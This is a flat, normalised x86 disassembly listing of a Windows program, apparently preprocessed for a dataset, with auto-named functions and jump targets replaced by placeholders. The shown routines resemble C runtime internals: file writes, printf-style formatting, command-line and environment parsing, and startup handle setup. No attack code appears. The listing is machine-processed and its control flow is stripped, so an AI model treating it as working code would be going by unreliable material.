mov al [ eax + esi + 0x4 ]
test al 0x1
je r-xdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
test al 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push ecx
call sub_40c2e5
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
mov [ rw-data ] 0x1c
mov [ rw-data ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_40b010
pop ecx
jmp r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] eax
jmp r-xdata
sub_40c86c
push ebp
mov ebp esp
sub esp 0x450
mov eax [ ebp + 0xc ]
add [ ebp + 0xc ] 0x2
push ebx
xor ecx ecx
mov bx [ eax ]
push esi
cmp bx cx
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x14 ] ecx
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
xor esi esi
jmp r-xdata
cmp [ ebp - 0x14 ] esi
jl r-xdata
push 0x20
pop edi
cmp bx di
jb r-xdata
xor eax eax
cmp bx 0x78
ja r-xdata
mov eax [ ebp + 0xc ]
add [ ebp + 0xc ] 0x2
xor esi esi
mov bx [ eax ]
cmp bx si
jne r-xdata
jmp [ eax * 4 + jump_table_40cf99 ]
movzx eax bx
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x38 ]
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] esi
jmp r-xdata
movzx eax bx
sub eax edi
je r-xdata
cmp bx 0x2a
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp bx 0x2a
jne r-xdata
movzx eax bx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] 0x1
push eax
push [ ebp + 0x8 ]
push ebx
call sub_40cfb9
add esp 0xc
jmp r-xdata
movzx eax bx
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x38 ] eax
cmp eax ecx
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x28 ]
movzx ecx bx
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
cmp eax esi
pop ecx
mov [ ebp - 0x28 ] eax
jge r-xdata
mov eax [ ebp - 0x10 ]
movzx ecx bx
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
cmp eax esi
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x28 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x38 ] esi
cmp [ eax + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] edi
jmp r-xdata
cmp eax 0x77
jne r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x10 ] esi
lea edi [ ebp - 0x450 ]
mov [ ebp - 0xc ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
add [ ebp + 0xc ] 0x4
or [ ebp - 0x3 ] 0x80
jmp r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d050
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x8 ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x50 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x4c ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x450 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bx 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
cmp eax esi
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] ecx
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_40d043
pop ecx
xor edx edx
call sub_40d043
pop ecx
jmp r-xdata
call sub_40d043
pop ecx
movzx eax ax
jmp r-xdata
call sub_40d043
pop ecx
movsx eax ax
mov esi eax
mov edi edx
cmp edx esi
jg r-xdata
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bx 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
push eax
mov ecx [ eax + 0x4 ]
cmp ecx esi
je r-xdata
push 0x1
lea eax [ ebp + 0x10 ]
pop esi
push eax
mov [ ebp - 0x1c ] esi
call sub_40d043
test [ ebp - 0x4 ] 0x20
pop ecx
mov [ ebp - 0x3c ] eax
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x20 ] 0x30
add eax 0x51
mov [ ebp - 0x18 ] 0x2
mov [ ebp - 0x1e ] ax
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x450 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x450 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
mov [ ebp - 0x450 ] ax
push [ rw-data ]
and [ ebp - 0x21 ] 0x0
mov [ ebp - 0x22 ] al
lea eax [ ebp - 0x22 ]
push eax
lea eax [ ebp - 0x450 ]
push eax
call sub_40efb5
add esp 0xc
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0x34 ] 0x1
add ebx edi
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
cmp eax esi
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
test [ ebp - 0x4 ] 0x20
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0x8 ] 0xa
sub eax 0x3
jne r-xdata
push edi
jmp r-xdata
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x44f ]
mov [ ebp - 0xc ] edi
lea eax [ ebp - 0x450 ]
push eax
call [ rw-data ]
pop ecx
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
movsx eax [ eax ]
mov [ ebp - 0x1c ] esi
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
lea eax [ ebp - 0x450 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x30 ] esi
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x251 ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x18 ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
xor esi esi
jmp r-xdata
call sub_40e5a0
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0x8 ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] edx
call sub_40e700
push [ ebp - 0x44 ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x48 ]
push edi
push esi
call sub_40e690
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov [ ebp - 0x1c ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
and [ ebp - 0x8 ] 0x0
test esi esi
jle r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x8 ] 0x10
je r-xdata
mov esi [ ebp - 0x28 ]
sub esi [ ebp - 0x18 ]
sub esi [ ebp - 0x8 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x4 ] 0x20
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x251 ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x8 ] eax
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0x8 ]
push [ ebp - 0x18 ]
push eax
call sub_40d00a
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40cfd9
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x20 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x30
jne r-xdata
inc eax
inc eax
jmp r-xdata
mov edx [ rw-data ]
movzx eax al
test [ edx + eax * 2 + 0x1 ] 0x80
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x20 ] 0x2b
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec [ ebp - 0xc ]
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ eax ] 0x30
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
inc ecx
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] esi
jl r-xdata
inc ecx
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call sub_40d00a
add esp 0x10
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_40cfd9
add esp 0x10
mov [ ebp - 0x20 ] 0x20
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40cfd9
add esp 0x10
mov eax [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
lea ebx [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x3c ]
call sub_40cfb9
add edi [ ebp - 0x40 ]
add esp 0xc
mov eax ebx
dec ebx
test eax eax
jg r-xdata
push [ rw-data ]
lea eax [ ebp - 0x3c ]
push edi
push eax
call sub_40efb5
add esp 0xc
mov [ ebp - 0x40 ] eax
test eax eax
jle r-xdata
jmp r-xdata
sub_40cfd9
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_40cfb9
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_40d00a
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
mov ax [ esi ]
push edi
push [ esp + 0x1c ]
inc esi
inc esi
push eax
call sub_40cfb9
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_40d060
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_40d1a1
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
push esi
cmp ecx edx
jge r-xdata
mov eax [ eax ]
mov esi [ rw-data ]
cmp eax 0xc000008e
jne r-xdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rw-data ]
cmp eax 0xc0000090
jne r-xdata
mov [ rw-data ] 0x83
jmp r-xdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ rw-data ] 0x81
jmp r-xdata
push [ rw-data ]
push 0x8
call ebx
pop ecx
mov [ rw-data ] esi
pop ecx
pop esi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ rw-data ] 0x84
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ rw-data ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ rw-data ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ rw-data ] 0x86
jmp r-xdata
mov [ rw-data ] 0x8a
sub_40d1a1
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40d1e4
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_40f578
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_40f172
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_40d23c
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_40f578
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_408e82
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_409a6f
pop ecx
push esi
call sub_40e5a0
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_4091a9
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_408e82
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_40e5a0
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_40f5a0
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_409a6f
pop ecx
sub_40d2f5
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_40f578
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40d38e
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_408e82
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40d38e
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_409a6f
pop ecx
sub_40d38e
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_40d542
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_408e82
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_408e82
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_40bfb0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4091a9
pop ecx
mov [ esp + 0x10 ] ebx
sub_40d674
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_408e82
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_409a6f
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x8
add eax 0x100
jmp r-xdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] esi
jge r-xdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor edi edi
test esi esi
jle r-xdata
mov edi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
add [ rw-data ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne r-xdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl r-xdata
mov cl [ ebp ]
test cl 0x1
